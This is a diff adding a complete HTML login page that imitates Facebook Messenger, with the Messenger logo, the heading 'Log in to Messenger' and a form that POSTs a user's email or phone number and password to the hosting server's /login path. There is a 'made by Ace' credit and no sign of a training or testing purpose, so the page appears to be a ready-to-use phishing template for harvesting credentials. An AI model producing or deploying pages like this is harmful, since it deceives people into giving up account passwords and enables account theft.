@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Messenger</title>
+<link rel="stylesheet" href="/static/style.css">
+</head>
+<body class="msgr-body">
+<div class="msgr-container">
+  <div class="msgr-card">
+    <svg class="msgr-logo" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg" width="64">
+      <radialGradient id="mg" cx="19%" cy="92%" r="99%">
+        <stop offset="0%" stop-color="#09F"/>
+        <stop offset="60%" stop-color="#A033FF"/>
+        <stop offset="90%" stop-color="#FF5280"/>
+        <stop offset="100%" stop-color="#FF7061"/>
+      </radialGradient>
+      <path fill="url(#mg)" d="M18 0C8.06 0 0 7.75 0 17.31c0 5.44 2.48 10.28 6.38 13.44.33.27.53.68.54 1.11l.09 3.03c.03 1.05 1.14 1.73 2.09 1.29l3.38-1.48c.32-.14.68-.17 1.02-.08 1.76.48 3.62.74 5.5.74 9.94 0 18-7.75 18-17.31S27.94 0 18 0z"/>
+      <path fill="#FFF" d="M7.5 22.1l5.28-8.38c.84-1.33 2.63-1.66 3.89-.71l4.2 3.15c.38.29.92.29 1.3 0l5.68-4.31c.76-.58 1.75.33 1.24 1.14l-5.29 8.38c-.84 1.33-2.63 1.66-3.89.71l-4.2-3.15c-.38-.29-.92-.29-1.3 0l-5.67 4.31c-.76.58-1.75-.33-1.24-1.14z"/>
+    </svg>
+    <h1>Log in to Messenger</h1>
+    <p class="msgr-sub">Use your Facebook account to continue</p>
+    <form action="/login" method="POST" autocomplete="off">
+      <input type="text" name="email" placeholder="Email address or phone number" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit" class="msgr-btn">Continue</button>
+    </form>
+    <p class="msgr-foot">Forgot your password? <a href="#">Get help</a></p>
+  </div>
+  <div class="g-made">made by <span>←→ Ace</span></div>
+</div>
+</body>
+</html>
